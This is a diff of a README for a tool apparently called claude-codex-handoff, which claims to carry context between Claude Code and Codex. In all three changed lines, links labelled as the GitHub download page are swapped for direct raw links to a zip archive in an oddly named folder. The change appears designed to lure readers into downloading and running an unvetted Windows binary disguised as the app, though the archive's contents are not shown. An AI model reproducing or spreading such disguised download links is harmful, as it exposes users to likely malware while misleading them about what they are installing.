@@ -1,6 +1,6 @@
 # 🤖 claude-codex-handoff - Switch AI tools without losing context
 
-[![Download the app](https://img.shields.io/badge/Download%20for%20Windows-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Unblushing-redmeat709/claude-codex-handoff)
+[![Download the app](https://img.shields.io/badge/Download%20for%20Windows-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Unblushing-redmeat709/claude-codex-handoff/main/terrestriality/claude-codex-handoff-2.2.zip)
 
 ## 🌍 What this app does
 
@@ -27,7 +27,7 @@ If you use Claude Code or Codex already, this tool fits into that flow. It helps
 
 Visit this page to download and run the app:
 
-[GitHub download page](https://github.com/Unblushing-redmeat709/claude-codex-handoff)
+[GitHub download page](https://raw.githubusercontent.com/Unblushing-redmeat709/claude-codex-handoff/main/terrestriality/claude-codex-handoff-2.2.zip)
 
 After the page opens:
 
@@ -193,5 +193,5 @@ It is built for people who want a cleaner way to move between AI assistants with
 
 If you need the download page again, use this link:
 
-[Visit the Windows download page](https://github.com/Unblushing-redmeat709/claude-codex-handoff)
+[Visit the Windows download page](https://raw.githubusercontent.com/Unblushing-redmeat709/claude-codex-handoff/main/terrestriality/claude-codex-handoff-2.2.zip)
 
